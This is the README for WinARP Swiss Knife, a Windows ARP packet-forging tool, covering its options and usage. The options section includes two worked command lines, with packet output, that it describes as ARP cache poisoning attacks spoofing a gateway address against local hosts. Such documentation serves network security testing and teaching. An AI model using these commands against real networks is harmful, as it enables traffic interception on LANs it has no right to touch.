+---------------------------------+
 WinARP Swiss Knife version 0.9.1  
 http://www.arp-sk.org             
+---------------------------------+
  

winarp_sk is a swiss knife tool for ARP. You can forge your own ARP 
packets (Ethernet and ARP headers). This tool is based on the 
tool arp_sk.

It needs the WinPcap driver available at http://winpcap.polito.it/
and works on Win9x/Win2K/WinXP.


-- Options --

WinARP Swiss Knife version 0.9.1

usage: winarp_sk.exe -m mode [-D dst_ether_addr] [-S src_ether_addr] 
                    [-F sender_MAC] -d sender_IP [-T target_MAC] 
                     -s target_IP [-t delay] [-c count]

Ethernet options:
  -D  ethernet address of destination [MAC of ARP target]
  -S  ethernet address of source [selected adapter MAC address]

ARP options:
  -m  ARP mode (request = 1 and reply = 2)
  -F  MAC address of sender [selected adapter MAC address]
  -s  IP address of sender
  -T  MAC address of target [MAC of ARP target]
  -d  IP address of target

Misc. options:
  -c  number of packets to send [infinity]
  -t  time between successive packets in ms [2000 ms]
  -h  help

Standalone options:
  -a  show ethernet address of adapter
  -i  show ip address
  -g  ip_addr : get the remote MAC address of a host


-- Options description --

[Ethernet options]

-S: set the Ethernet source address of the packet in Windows format.
    Default : MAC address of the adapter used to send the packet.

-D: set the Ethernet destination address of the packet. 
    Default : MAC address of the ARP target specified by the -d option.

Note: a MAC address in Windows format is : XX-XX-XX-XX-XX-XX


[ARP options]

-m: set the ARP opcode.
    1 : build an ARP request packet
    2 : build an ARP reply packet

-F: set the MAC address of the sender host.
    Default : MAC address of the adapter used to send the packet.

-s: set the IP address of the sender host.

-T: set the MAC address of the target host.
    Default : MAC address of the ARP target specified by the -d option.

-d: set the IP address of the target host.

So a default packet is like :
winarp_sk.exe -m 2 -s 192.168.1.1 -d 192.168.1.10

+ ETH - Destination MAC : 00-10-B5-AC-1D-00
+ ETH - Source MAC      : 00-60-08-DE-64-F0
+ ARP - ARP Reply
+ ARP - Sender MAC address : 00-60-08-DE-64-F0
+ ARP - Sender IP address  : 192.168.1.1
+ ARP - Target MAC address : 00-10-B5-AC-1D-00
+ ARP - Target IP address  : 192.168.1.10

In this example an ARP reply packet is send with a spoofed sender 
192.168.1.1 to the target host 192.168.1.10. This is used for
simple ARP cache poisoning against Win 9x/2K boxes.

Another example for ARP cache poisoning :
winarp_sk -m 1 -s 192.168.1.1 -d 192.168.1.11

+ ETH - Destination MAC : 00-A0-C9-41-DB-1B
+ ETH - Source MAC      : 00-60-08-DE-64-F0
+ ARP - ARP Request
+ ARP - Sender MAC address : 00-60-08-DE-64-F0
+ ARP - Sender IP address  : 192.168.1.1
+ ARP - Target MAC address : 00-A0-C9-41-DB-1B
+ ARP - Target IP address  : 192.168.1.11

This example used ARP request packet for ARP cache poisoning against
Linux/Win XP (and the others) boxes.


[Miscellaneous options]

-c: set the number of packets to send.
    Default : packets are send until a key is hit.

-t: set the time between successive packets in ms.
    Default : the delay is 2000 ms between two packets.

-h: help


[Standalone options]

-a: show the MAC address of the selected adapter.

-i: show the current ip address.

-g: get the MAC address from the IP address of the specified host.


-- Authors --

[Lead developer and maintainer]

Eric Detoisien  - <eric_detoisien@hotmail.com>


[Lead Coordinators]

Cédric Blancher - <blancher@cartel-securite.fr>
Frédéric Raynal	- <pappy@miscmag.com>



